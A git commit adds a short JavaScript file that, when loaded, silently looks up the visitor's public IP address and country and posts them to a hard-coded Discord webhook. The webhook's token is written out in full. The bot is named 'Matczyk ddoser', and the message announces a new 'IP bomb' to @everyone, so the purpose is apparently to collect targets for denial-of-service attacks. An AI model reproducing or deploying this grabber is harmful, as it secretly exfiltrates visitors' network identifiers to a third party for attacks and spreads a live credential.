9dd6b6e2ffd68caa0e1e191a15799c44b418e883
Matczyk <91725718+Matczyk@users.noreply.github.com>
2022-08-30 22:24:13 +0200

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,37 @@
+var webHookUrl = "https://discordapp.com/api/webhooks/1014253977459757117/ugRH41WfFOFZ_eUgK-uzfaCwxlTSR0HK4pfuUe57Rt7ewL0IgiqCbFRU-n3ut_lANz9i";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "Matczyk ddoser",
+        avatar_url: "https://cdn.discordapp.com/avatars/627798896923377694/a_b81503bbf27bf37a5927a60d507fdbb7.gif?size=4096",
+        content:    "**NOWA KURWA IP BOMBA** @everyone \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+		
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
